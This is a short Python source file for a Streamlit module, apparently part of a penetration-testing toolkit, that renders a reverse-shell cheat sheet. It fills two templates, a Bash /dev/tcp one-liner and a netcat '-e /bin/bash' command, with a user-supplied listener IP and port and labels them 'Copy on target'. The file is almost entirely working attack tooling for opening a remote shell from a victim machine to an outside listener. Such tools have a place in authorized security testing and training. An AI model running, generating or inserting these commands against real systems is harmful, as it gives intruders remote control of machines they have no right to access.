import streamlit as st
from modules.base import BaseModule, ModuleRegistry

class ReverseShellModule(BaseModule):
    def __init__(self):
        super().__init__(name="Reverse Shell", key_prefix="reverse_shell")
        ModuleRegistry.register(self)

    SHELLS = {
        "Bash":  "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "NC":    "nc {ip} {port} -e /bin/bash"
    }

    def render(self):
        st.header("🪝 Reverse Shell Cheat-Sheet")
        ip = st.text_input("Listener IP", "127.0.0.1")
        port = st.text_input("Port", "9001")
        st.caption("Copy on target:")
        for name, tpl in self.SHELLS.items():
            st.code(tpl.format(ip=ip, port=port))

ReverseShellModule()
